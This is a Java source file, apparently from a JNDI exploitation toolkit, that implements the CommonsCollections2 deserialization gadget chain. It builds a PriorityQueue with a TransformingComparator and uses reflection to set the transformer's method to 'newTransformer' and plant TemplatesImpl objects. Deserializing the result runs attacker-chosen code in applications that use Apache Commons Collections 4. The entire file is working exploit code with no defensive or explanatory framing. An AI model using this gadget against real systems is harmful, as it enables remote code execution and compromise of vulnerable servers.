package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

    public Queue<Object> getObject(PayloadType type, String... param) throws Exception {
        final Object                templates         = Gadgets.createTemplatesImpl(type, param);
        final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

}
